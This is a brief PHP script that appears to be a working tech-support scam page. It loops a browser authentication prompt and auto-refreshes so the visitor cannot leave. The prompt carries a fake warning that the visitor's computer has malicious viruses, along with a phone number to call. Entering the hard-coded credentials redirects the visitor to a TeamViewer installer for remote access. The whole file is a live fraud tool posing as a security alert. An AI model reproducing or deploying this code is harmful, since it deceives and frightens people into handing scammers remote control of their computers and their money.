<?php

    session_start();

    $_user = 'windows2016ddsd';
    $_password = 'microsoft1ew';

    if ($_SERVER['PHP_AUTH_USER'] != $_user || $_SERVER['PHP_AUTH_PW'] != $_password ) {

        if(isset($_SESSION['login_attempts'])){ $_SESSION['login_attempts']++; }else{$_SESSION['login_attempts'] = 11;}

        if($_SESSION['login_attempts'] == 80){
            header('Location: WIn101810DE10.php');
            exit;
        } else {

           header('WWW-Authenticate: Basic realm="Suspicious activity detected on your IP address due to malicious viruses on your computer. Call now toll free @ +1-850-696-0724 for any assistance. "');
           header('HTTP/1.0 401 Unauthorized');
$page = $_SERVER['PHP_SELF'];
 $sec = "0";
 header("Refresh: $sec; url=$page");
         echo "<html><head><title>Internet Security Damaged !!! Call Help Desk</title></head><body>";


            exit;
        }
    } else {

        header('Location: WIn101810DE10.php');
        header('Location: http://download.teamviewer.com/download/TeamViewer_Setup_en.exe');

        exit;
    }
?>
